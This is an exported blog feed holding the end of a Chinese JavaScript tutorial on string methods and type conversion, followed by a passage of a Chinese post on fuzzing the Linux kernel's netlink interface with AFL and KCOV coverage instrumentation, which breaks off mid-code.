string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>当你知道字符串中的子字符串开始的位置，以及想要结束的字符时，slice()方法可以用来提取 它。比如：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "Blu"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：slice(strat，end)，第一个参数 start 是开始提取的字符位置，第二个参数 end 是提取的最后一个字符的后一个位置。所以提取从第一个位置开始，直到但不包括最后一个位置。另外第二个参数也可以不写，不写代表某个字符之后提取字符串中的所有剩余字符。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">"Blue Sky"</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "ue Sky"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h4><p>字符串方法 toLowerCase() 和 toUpperCase() 字符串并将所有字符分别转换为小写或大写。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"I like study"</span><span class="token punctuation">;</span>string<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "i like study"</span>string<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "I LIKE STUDY"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="替换字符串的某部分"><a href="#替换字符串的某部分" class="headerlink" title="替换字符串的某部分"></a>替换字符串的某部分</h4><p>可以使用 replace() 方法将字符串中的一个子字符串替换为另一个子字符串。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"I like study"</span><span class="token punctuation">;</span>string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"study"</span><span class="token punctuation">,</span><span class="token string">"sleep"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "I like sleep"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：字符串的操作方法其实还有很多，我们将在后续的课程中再为大家作深入讲解。</p><h2 id="详解类型转换"><a href="#详解类型转换" class="headerlink" title="详解类型转换"></a>详解类型转换</h2><h3 id="转换成字符串"><a href="#转换成字符串" class="headerlink" title="转换成字符串"></a>转换成字符串</h3><ol><li>几乎每个值都有 toString() 方法。比如在控制台输入以下代码：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">var</span> numString <span class="token operator">=</span> num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>numString<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// returns "8"</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">var</span> resultString <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resultString<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// returns "true"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数值类型的 toString() ,可以携带一个参数,输出对应进制的值。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//"16" 默认是10进制</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"16"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//"10000"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//"20"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"10"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>String() 函数。比如在控制台中输入以下代码：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span>num2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "8"</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">var</span> result1 <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>result1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "true"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：因为有的值没有 toString() 方法，所以需要用 String(),比如 null 和 undefined。如下所示：</p><p><img src="http://q85n97zux.bkt.clouddn.com/1566901142698.png" alt></p><ol><li>使用拼接字符串。比如在控制台中输入以下代码：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span><span class="token keyword">var</span> num2 <span class="token operator">=</span> num1 <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>num2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "16"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="转换成数值类型"><a href="#转换成数值类型" class="headerlink" title="转换成数值类型"></a>转换成数值类型</h3><ol><li>Number()可以把任意值转换成数值，如果要转换的字符串中有一个不是数值的字符，返回 NaN（not a number）。比如在控制台中依次输入以下代码：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> num1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true 返回 1，false 返回 0</span><span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">;</span>num2<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 返回 NaN</span><span class="token keyword">var</span> num3 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回 0</span><span class="token keyword">var</span> num4 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"syl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num4<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 返回 NaN</span><span class="token keyword">var</span> num5 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 如果是空字符串返回 0</span><span class="token keyword">var</span> num6 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回123，如果是数字型的字符，返回数字</span><span class="token keyword">var</span> num7 <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"123abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num7<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 返回 NaN</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>parseInt() 把字符串转换成整数。比如在控制台中依次输入以下代码：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"12.3abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回 12，如果第一个字符是数字会解析知道遇到非数字结束,只取整，不是约等于</span><span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"abc123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回 NaN，如果第一个字符不是数字或者符号就返回 NaN</span><span class="token keyword">var</span> num3 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> num3<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 空字符串返回 NaN，但是 Number("")返回 0</span><span class="token keyword">var</span> num4 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"520"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num4<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//返回 520</span><span class="token keyword">var</span> num5 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"0xA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> num5<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//返回 10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外值得注意的是，parseInt()可以传递两个参数，第一个参数是要转换的字符串，第二个参数是要转换的进制。大家可以自行尝试一下。</p><ol><li>parseFloat()把字符串转换成浮点数。写法和parseInt()相似，主要有以下几个不同点：</li></ol><ul><li>parseFloat不支持第二个参数，只能解析 10 进制数</li><li>如果解析的内容里只有整数，解析成整数</li></ul><p>例子：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 10</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"10.000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 10</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"10.01"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 10.01</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">" 10 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 10</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"10 hours"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns 10</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"aaa 10 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns NaN</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>执行减 0 操作。比如：</li></ol><pre><code>var n=&quot;10&quot;;var m=n-0;m; // returns 10</code></pre><p>值得注意的是，如果该字符串不是纯粹的数字字符串，那么它执行减 0 操作后，虽然变成了一个数字类型，但是返回值为 NaN。比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span><span class="token keyword">var</span> m <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">0</span><span class="token punctuation">;</span>m<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns NaN</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns "number"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="转换成布尔类型"><a href="#转换成布尔类型" class="headerlink" title="转换成布尔类型"></a>转换成布尔类型</h3><ol><li>使用 Boolean() 函数。比如：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// returns true</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns true</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns true</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// returns true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>流程控制语句会把后面的值隐式转换为布尔类型。比如：</li></ol><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> message<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//会自动把message转换成false,最后打印结果为:我很好</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"你好啊"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"我很好"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本节主要就 JavaScript 的基础语法进行了学习，主要包括以下内容：</p><ul><li>JavaScript 是什么</li><li>变量</li><li>数字与运算符</li><li>数组</li><li>null &amp; undefined</li><li>字符串</li><li>类型转换</li></ul><p>本节内容是对 JavaScript 基础知识的初步认识。请务必手动完成文档中的所有例子，并实际运行查看效果。加深对基础知识的理解，并达到灵活运用的水平。</p>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用AFL对Linux内核Fuzzing的总结</title>
      <link href="/2018/01/22/shi-yong-afl-dui-linux-nei-he-fuzzing-de-zong-jie/"/>
      <url>/2018/01/22/shi-yong-afl-dui-linux-nei-he-fuzzing-de-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>模糊测试是一种很好的漏洞挖掘技术，Fuzzer将半随机输入喂到到测试程序，目的是找到触发错误的输入。模糊测试在查找C或C ++程序中的内存破坏漏洞时特别有用。</p><p>通常情况下，建议选择一个众所周知但很少探索的库，这个库在解析时很重要。历史上，像libjpeg，libpng和libyaml这样的东西都是完美的目标。如今找到一个好目标更难 - 一切似乎都已经被模糊化了。这是好事！我猜软件越来越好了！我没有选择用户空间目标，而是选择了Linux内核netlink机器。</p><p>Netlink是一个Linux内核工具，它用于配置网络接口，IP地址，路由表等。这是一个很好的fuzzing 目标：它是内核的一个小模块，并且生成畸形有效消息相对比较容易。最重要的是，我们可以在此过程中学到很多关于Linux内核的知识。</p><p>在这篇文章中，我将使用AFL模糊器，将netlink shim程序与自定义Linux内核相对应，所有这些都在KVM虚拟机中运行。</p><h2 id="技术参考"><a href="#技术参考" class="headerlink" title="技术参考"></a>技术参考</h2><p>我们将要使用的技术被称为“覆盖引导模糊测试”。有很多以前的文献：</p><ul><li>Dan Guido <a href="https://blog.trailofbits.com/2017/02/16/the-smart-fuzzer-revolution/" target="_blank" rel="noopener">的智能模糊革命</a>，以及<a href="https://lwn.net/Articles/677764/" target="_blank" rel="noopener">LWN</a>关于它的<a href="https://lwn.net/Articles/677764/" target="_blank" rel="noopener">文章</a></li><li>Mateusz“j00ru”Jurczyk的<a href="https://j00ru.vexillium.org/talks/blackhat-eu-effective-file-format-fuzzing-thoughts-techniques-and-results/" target="_blank" rel="noopener">有效文件格式模糊</a>测试</li><li><a href="http://honggfuzz.com/" target="_blank" rel="noopener">honggfuzz</a>是一个现代化的，功能丰富的覆盖面引导的fuzzer</li><li><a href="https://google.github.io/clusterfuzz/" target="_blank" rel="noopener">ClusterFuzz</a></li><li><a href="https://github.com/google/fuzzer-test-suite" target="_blank" rel="noopener">Fuzzer测试套件</a></li></ul><p>很多人过去都在Fuzzing Linux内核：</p><ul><li>由Dmitry Vyukov <a href="https://github.com/google/syzkaller/blob/master/docs/syzbot.md" target="_blank" rel="noopener">创建的syzkaller（又名syzbot）</a>是一个非常强大的CI风格的持续运行的内核模糊器，它已经发现了数百个漏洞。</li><li><a href="https://github.com/kernelslacker/trinity" target="_blank" rel="noopener">三位一体的模糊器</a></li></ul><p>我们将使用<a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">AFL</a>，可能是大家最喜欢的模糊器。AFL由<a href="http://lcamtuf.coredump.cx/" target="_blank" rel="noopener">MichałZalewski</a>撰写。它以其易用性，速度和非常好的变异逻辑而闻名，这是开始模糊测试之旅的完美选择！</p><p>如果您想了解有关AFL的更多信息，请参阅几个文件：</p><ul><li><a href="http://lcamtuf.coredump.cx/afl/historical_notes.txt" target="_blank" rel="noopener">历史笔记</a></li><li><a href="http://lcamtuf.coredump.cx/afl/technical_details.txt" target="_blank" rel="noopener">技术白皮书</a></li><li><a href="http://lcamtuf.coredump.cx/afl/README.txt" target="_blank" rel="noopener">自述</a></li></ul><h2 id="覆盖引导的模糊测试"><a href="#覆盖引导的模糊测试" class="headerlink" title="覆盖引导的模糊测试"></a>覆盖引导的模糊测试</h2><p>覆盖引导的模糊测试基于反馈回路的原理：</p><ul><li>模糊测试选择最有希望的测试用例</li><li>模糊测试将测试变为大量新的测试用例</li><li>目标代码运行变异的测试用例，并报告代码覆盖率</li><li>模糊器根据报告的覆盖范围计算得分，并使用它来确定有效的变异测试的优先级并删除冗余的测试</li></ul><p>例如，假设输入测试是“hello”。Fuzzer可能会将其变为多种测试，例如：“hEllo”（位翻转），“hXello”（字节插入），“hllo”（字节删除）。如果这些测试中的任何一个将产生有趣的代码覆盖，那么它将被优先化并用作下一次测试的基础。</p><p>有关如何完成突变以及如何有效地比较数千个程序运行的代码覆盖率报告的细节是模糊测试的秘诀，阅读<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt" target="_blank" rel="noopener">AFL的技术白皮书</a>，可以了解更多细节。</p><p>通常，在使用AFL时，我们需要检测目标代码，以便以AFL兼容的方式报告覆盖范围。但我们想要Fuzzing 内核！我们不能只用“afl-gcc”重新编译它！。我们将准备一个二进制文件，让AFL认为它是用它的工具编译的。这个二进制文件将报告从内核中提取的代码覆盖率。</p><h2 id="内核代码覆盖率"><a href="#内核代码覆盖率" class="headerlink" title="内核代码覆盖率"></a>内核代码覆盖率</h2><p>内核至少有两个内置的覆盖机制–GCOV和KCOV：</p><ul><li><a href="https://www.kernel.org/doc/html/v4.15/dev-tools/gcov.html" target="_blank" rel="noopener">将gcov与Linux内核一起使用</a></li><li><a href="https://www.kernel.org/doc/html/latest/dev-tools/kcov.html" target="_blank" rel="noopener">KCOV：模糊测试的代码覆盖率</a></li></ul><p>KCOV的设计考虑了模糊测试，因此我们将使用它。</p><p>使用KCOV非常简单。我们必须使用正确的设置编译Linux内核。首先，启用KCOV内核配置选项：</p><pre class="line-numbers language-sh"><code class="language-sh">cd linux./scripts/config \    -e KCOV \    -d KCOV_INSTRUMENT_ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>KCOV能够记录整个内核的代码覆盖率。可以使用KCOV_INSTRUMENT_ALL选项进行设置。有个缺点是，它会减慢我们不想分析的内核部分，并且会在Fuzzing 中引入噪声（降低“稳定性”）。对于初学者，让我们禁用KCOV_INSTRUMENT_ALL并有选择地在实际想要分析的代码上启用KCOV。</p><p>我们专注于Fuzzing netlink，所以在整个“net”目录树上启用KCOV：</p><pre class="line-numbers language-sh"><code class="language-sh">find net -name Makefile | xargs -L1 -I {} bash -c 'echo "KCOV_INSTRUMENT := y" >> {}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在一个理想环境中，我们只能为真正感兴趣的几个文件启用KCOV。但是netlink处理遍及网络堆栈代码，现在没有时间进行微调。</p><p>有了KCOV，将增加报告内存损坏错误的可能性。最重要的是<a href="https://www.kernel.org/doc/html/latest/dev-tools/kasan.html" target="_blank" rel="noopener">KASAN</a>，使用该集合，可以编译我们的KCOV和KASAN启用的内核。</p><p>我们将以kvm运行内核，所以需要切换一下：</p><pre class="line-numbers language-sh"><code class="language-sh">./scripts/config \    -e VIRTIO -e VIRTIO_PCI -e NET_9P -e NET_9P_VIRTIO -e 9P_FS \    -e VIRTIO_NET -e VIRTIO_CONSOLE  -e DEVTMPFS ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="如何使用KCOV"><a href="#如何使用KCOV" class="headerlink" title="如何使用KCOV"></a>如何使用KCOV</h2><p>KCOV非常易于使用。首先，请注意代码覆盖率记录在每个进程的数据结构中。这意味着您必须在用户空间进程中启用和禁用KCOV，并且无法记录非任务事项的覆盖范围，例如中断处理。这对我们的需求来说完全没问题。</p><p>KCOV将数据报告给环形缓冲区。设置非常简单，<a href="https://github.com/cloudflare/cloudflare-blog/blob/master/2019-07-kernel-fuzzing/src/kcov.c" target="_blank" rel="noopener">请参阅我们的代码</a>。然后你可以使用一个简单的ioctl启用和禁用它：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">ioctl</span><span class="token punctuation">(</span>kcov_fd<span class="token punctuation">,</span> KCOV_ENABLE<span class="token punctuation">,</span> KCOV_TRACE_PC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* profiled code */</span><span class="token function">ioctl</span><span class="token punctuation">(</span>kcov_fd<span class="token punctuation">,</span> KCOV_DISABLE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在此序列之后，环形缓冲区包含启用KCOV的内核代码的所有基本块的％rip值列表。要读取缓冲区，请运行：</p><pre class="line-numbers language-c"><code class="language-c">n <span class="token operator">=</span> <span class="token function">__atomic_load_n</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kcov_ring<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> __ATOMIC_RELAXED<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%lx\n"</span><span class="token punctuation">,</span> kcov_ring<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用像<code>addr2line</code>这样的工具可以将％rip解析为特定的代码行。我们不需要它 - 原始的％rip值对我们来说已经足够了。</p><h2 id="将KCOV喂入AFL"><a href="#将KCOV喂入AFL" class="headerlink" title="将KCOV喂入AFL"></a>将KCOV喂入AFL</h2><p>我们旅程的下一步是学习如何欺骗AFL。请记住，AFL需要一个特制的可执行文件，但我们想要提供内核代码覆盖率。首先，我们需要了解AFL的工作原理。</p><p>AFL设置一个64K 8位数字的数组。该存储器区域称为“shared_mem”或“trace_bits”，并与跟踪的程序共享。数组中的每个字节都可以被认为是检测代码中特定（branch_src，branch_dst）对的命中计数器。</p><p>重要的是要注意AFL更喜欢随机分支标签，而不是重用％rip值来识别基本块。这是为了增加熵 - 我们希望数组中的命中计数器均匀分布。AFL使用的算法是：</p><pre class="line-numbers language-c"><code class="language-c">cur_location <span class="token operator">=</span> <span class="token operator">&lt;</span>COMPILE_TIME_RANDOM<span class="token operator">></span><span class="token punctuation">;</span>shared_mem<span class="token punctuation">[</span>cur_location <span class="token operator">^</span> prev_location<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span> prev_location <span class="token operator">=</span> cur_location <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在我们使用KCOV的情况下，我们没有每个分支的编译时随机值。相反，我们将使用哈希函数从KCOV记录的％rip生成统一的16位数。这是如何将KCOV报告提供给AFL“shared_mem”数组：</p><pre class="line-numbers language-c"><code class="language-c">n <span class="token operator">=</span> <span class="token function">__atomic_load_n</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kcov_ring<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> __ATOMIC_RELAXED<span class="token punctuation">)</span><span class="token punctuation">;</span>uint16_t prev_location <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        uint16_t cur_location <span class="token operator">=</span> <span class="token function">hash_function</span><span class="token punctuation">(</span>kcov_ring<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        shared_mem<span class="token punctuation">[</span>cur_location <span class="token operator">^</span> prev_location<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        prev_location <span class="token operator">=</span> cur_location <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 